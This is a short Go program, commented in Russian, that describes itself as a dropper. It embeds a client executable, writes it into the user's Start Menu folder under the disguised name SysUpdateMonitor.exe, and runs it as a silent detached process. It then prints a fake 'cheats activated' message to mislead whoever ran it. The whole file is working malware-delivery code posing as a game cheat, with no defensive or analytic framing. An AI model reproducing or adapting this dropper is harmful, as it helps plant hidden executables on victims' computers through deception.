package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

//go:embed client.exe
var embeddedExe []byte // содержит бинарник клиента. директива go:embed указывает компилятору включить клиента в бинарник дроппера как слайс байтов

func main() {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return
	}
	// определение места, где будет бинарник клиента (папка стандартных приложений)
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Accessories")
	targetPath := filepath.Join(startupPath, "SysUpdateMonitor.exe")
	err := os.WriteFile(targetPath, embeddedExe, 0755) // создание файла
	if err != nil {
		return
	}
	cmd := exec.Command(targetPath) // запуск клиента отдельным процессом
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	// отключение потоков ввода-вывода
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	err = cmd.Start()
	if err != nil {
		return
	}
	cmd.Process.Release()
	fmt.Println("читы активированы хохохо") // заглушка для дроппера. по факту можно добавить любой функционал
}
